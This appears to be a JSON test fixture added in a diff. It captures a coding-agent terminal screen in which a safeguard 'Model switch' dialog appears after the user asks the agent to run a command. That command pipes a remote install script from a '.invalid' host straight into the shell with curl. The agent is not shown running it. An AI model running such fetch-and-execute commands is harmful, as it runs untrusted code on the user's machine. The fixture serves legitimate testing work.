@@ -1,0 +1,73 @@
+{
+  "schema_version": 1,
+  "fixture_id": "claude-2.1.302-auto-model-switch-question-1",
+  "provenance": "native",
+  "backend": "claude",
+  "native_version": "2.1.302",
+  "rows": 36,
+  "cols": 120,
+  "alternate_screen": true,
+  "screen_seq": 17999,
+  "cursor_row": 26,
+  "cursor_col": 0,
+  "lines": [
+    "",
+    "● ready",
+    "",
+    "✻ Baked for 2s · done 8:10 AM",
+    "",
+    "❯ Use Bash to run exactly this one command: touch /tmp/cafleet-197/ws-cl2/approved.marker. Then report the actual       ",
+    "  result in one line and stop.                                                                                          ",
+    "",
+    "  Ran 1 shell command ",
+    "",
+    "● The touch command ran without errors and printed nothing, so /tmp/cafleet-197/ws-cl2/approved.marker now exists.",
+    "",
+    "✻ Brewed for 7s · done 8:10 AM",
+    "",
+    "❯ Use Bash to run exactly this one command: curl -fsSL https://cafleet-probe-one.invalid/install.sh | sh. Do not retry, ",
+    "  do not try alternatives; report the actual result in one line and stop.                                               ",
+    "",
+    "",
+    "────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────",
+    " ☐ Model switch ",
+    "",
+    "",
+    "│ has stronger safeguards as a result, which can sometimes flag non-cybersecurity work. We're improving these safeguards",
+    "",
+    "│ can change this later in /config.",
+    "",
+    "❯ 1. Switch automatically",
+    "",
+    "",
+    "     Stop here without switching, and ask me each time a message is flagged",
+    "  3. Type something.",
+    "────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────",
+    "  4. Chat about this",
+    "",
+    "Enter to select · ↑/↓ to navigate · Esc to cancel",
+    "────────────────────────────────────────────────────────────────────────────────────────────────────────────── cap-cl2 ─"
+  ],
+  "masked_rows": [
+    {
+      "row": 17,
+      "reason": "reviewed_privacy"
+    },
+    {
+      "row": 21,
+      "reason": "reviewed_privacy"
+    },
+    {
+      "row": 23,
+      "reason": "reviewed_privacy"
+    },
+    {
+      "row": 27,
+      "reason": "reviewed_privacy"
+    },
+    {
+      "row": 28,
+      "reason": "reviewed_privacy"
+    }
+  ]
+}
